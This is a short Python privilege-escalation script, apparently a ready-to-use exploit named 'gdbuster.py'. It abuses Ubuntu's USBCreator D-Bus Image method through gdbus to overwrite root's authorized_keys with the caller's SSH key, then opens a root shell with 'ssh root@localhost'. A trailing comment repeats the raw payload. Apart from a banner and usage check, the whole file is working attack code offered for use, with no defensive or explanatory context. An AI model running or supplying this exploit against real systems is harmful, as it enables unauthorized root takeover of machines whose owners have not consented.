import sys
import os

banner = """
    ____ ____  ____        ____  _   _____
   / ___|  _ \| __ ) _   _ | ___|| |_|___ / _ __
  | |  _| | | |  _ \| | | |___ \| __| |_ \| '__|
  | |_| | |_| | |_) | |_| |___) | |_ ___) | |
   \____|____/|____/ \__,_|____/ \__|____/|_|


[+]Privilege-Escalation Script For gdbus
[+]write the ssh-pubkey to root authorized_keys as root

"""

print(banner)

if len(sys.argv) != 2:
    print("[!]need argument ")
    print("[-]Usage: python3 gdbuster.py <user_name>")
    sys.exit()

username = sys.argv[1]

payload = "gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/"

payload += username

payload += "/.ssh/authorized_keys /root/.ssh/authorized_keys true"

os.system(payload)

os.system("ssh root@localhost")



"""
Origin_payload:

gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/$username/.ssh/authorized_keys /root/.ssh/authorized_keys true

and 

ssh root@localhost 

"""

